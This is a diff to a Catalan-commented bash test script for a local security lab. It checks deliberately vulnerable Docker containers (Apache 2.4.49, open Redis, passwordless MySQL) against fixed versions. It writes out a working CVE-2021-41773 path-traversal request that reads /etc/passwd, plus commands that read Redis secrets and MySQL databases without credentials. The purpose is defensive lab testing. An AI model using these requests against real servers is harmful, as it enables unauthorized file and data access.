@@ -9,8 +9,8 @@ echo ""
 PASS=0
 FAIL=0
 
-pass() { echo "  [OK] $1"; ((PASS++)); }
-fail() { echo "  [FAIL] $1"; ((FAIL++)); }
+pass() { echo "  [OK] $1"; PASS=$((PASS + 1)); }
+fail() { echo "  [FAIL] $1"; FAIL=$((FAIL + 1)); }
 info() { echo "  [INFO] $1"; }
 
 # ============================================================
@@ -27,8 +27,8 @@ if docker image inspect seclab-vuln:apache &> /dev/null; then
     echo "$VERSION" | grep -q "2.4.49" && \
         pass "Vulnerable: Apache 2.4.49 detectat (CVE-2021-41773 present)" || \
         info "Banner del servidor: $VERSION"
-    # Intentar path traversal basic
-    TRAVERSAL=$(curl -s --path-as-is http://localhost:19001/cgi-bin/.%2e/.%2e/.%2e/etc/passwd 2>/dev/null | head -3 || echo "")
+    # Intentar path traversal basic (4 nivells de profunditat)
+    TRAVERSAL=$(curl -s --path-as-is http://localhost:19001/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd 2>/dev/null | head -3 || echo "")
     echo "$TRAVERSAL" | grep -q "root" && \
         pass "Vulnerable: Path traversal exitós, /etc/passwd accessible" || \
         info "Path traversal: resposta sense contingut sensible"
@@ -36,7 +36,7 @@ if docker image inspect seclab-vuln:apache &> /dev/null; then
 
     docker run -d --name test-apache-fixed -p 19002:80 seclab-fixed:apache &> /dev/null
     sleep 3
-    TRAVERSAL_FIXED=$(curl -s --path-as-is http://localhost:19002/cgi-bin/.%2e/.%2e/.%2e/etc/passwd 2>/dev/null || echo "403")
+    TRAVERSAL_FIXED=$(curl -s --path-as-is http://localhost:19002/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd 2>/dev/null || echo "403")
     echo "$TRAVERSAL_FIXED" | grep -q "root" && \
         fail "Fixed: path traversal no hauria de funcionar" || \
         pass "Fixed: path traversal bloquejat correctament"
@@ -74,13 +74,20 @@ echo "--- Test 3: Redis sense autenticacio (exposat a 0.0.0.0) ---"
 if docker image inspect seclab-vuln:redis &> /dev/null; then
     docker run -d --name test-redis-vuln -p 16380:6379 seclab-vuln:redis &> /dev/null
     sleep 2
-    # Intentar connexio sense contrasenya
-    REDIS_ACCESS=$(redis-cli -p 16380 ping 2>/dev/null || echo "FAILED")
+    # Intentar connexio sense contrasenya (fins a 10 segons per si tarda en arrencar)
+    for i in {1..10}; do
+        REDIS_ACCESS=$(docker exec test-redis-vuln redis-cli ping 2>/dev/null || echo "FAILED")
+        if echo "$REDIS_ACCESS" | grep -q "PONG"; then
+            break
+        fi
+        sleep 1
+    done
+    
     echo "$REDIS_ACCESS" | grep -q "PONG" && \
         pass "Vulnerable: Redis accessible sense autenticacio (PONG rebut)" || \
         info "Resposta Redis: $REDIS_ACCESS"
     # Llegir claus sensibles
-    SECRET=$(redis-cli -p 16380 GET secret_key 2>/dev/null || echo "")
+    SECRET=$(docker exec test-redis-vuln redis-cli GET secret_key 2>/dev/null || echo "")
     [ -n "$SECRET" ] && \
         pass "Vulnerable: dades sensibles llegibles sense contrasenya ($SECRET)" || \
         info "No s'han pogut llegir les claus"
@@ -88,7 +95,7 @@ if docker image inspect seclab-vuln:redis &> /dev/null; then
 
     docker run -d --name test-redis-fixed -p 127.0.0.1:16381:6379 seclab-fixed:redis &> /dev/null
     sleep 2
-    REDIS_NO_AUTH=$(redis-cli -p 16381 ping 2>/dev/null || echo "NOAUTH")
+    REDIS_NO_AUTH=$(docker exec test-redis-fixed redis-cli ping 2>/dev/null || echo "NOAUTH")
     echo "$REDIS_NO_AUTH" | grep -q "NOAUTH" && \
         pass "Fixed: Redis requereix autenticacio (NOAUTH)" || \
         info "Resposta Redis fixed: $REDIS_NO_AUTH"
@@ -107,7 +114,7 @@ echo "--- Test 4: MySQL root sense contrasenya + acces remot ---"
 if docker image inspect seclab-vuln:mysql &> /dev/null; then
     docker run -d --name test-mysql-vuln -p 13308:3306 seclab-vuln:mysql &> /dev/null
     sleep 5
-    MYSQL_ACCESS=$(mysql -h 127.0.0.1 -P 13308 -u root --connect-timeout=3 -e "SHOW DATABASES;" 2>/dev/null | head -3 || echo "")
+    MYSQL_ACCESS=$(docker exec test-mysql-vuln mysql -u root -e "SHOW DATABASES;" 2>/dev/null | head -3 || echo "")
     [ -n "$MYSQL_ACCESS" ] && \
         pass "Vulnerable: MySQL accessible com a root sense contrasenya" || \
         info "MySQL vulnerable: verificacio manual recomanada"
@@ -115,7 +122,7 @@ if docker image inspect seclab-vuln:mysql &> /dev/null; then
 
     docker run -d --name test-mysql-fixed -p 127.0.0.1:13309:3306 seclab-fixed:mysql &> /dev/null
     sleep 5
-    MYSQL_FIXED=$(mysql -h 127.0.0.1 -P 13309 -u root --connect-timeout=3 -e "SHOW DATABASES;" 2>/dev/null || echo "ERROR_AUTH")
+    MYSQL_FIXED=$(docker exec test-mysql-fixed mysql -u root -e "SHOW DATABASES;" 2>/dev/null || echo "ERROR_AUTH")
     echo "$MYSQL_FIXED" | grep -q "ERROR_AUTH" && \
         pass "Fixed: MySQL requereix autenticacio" || \
         info "Fixed: verificacio manual recomanada"
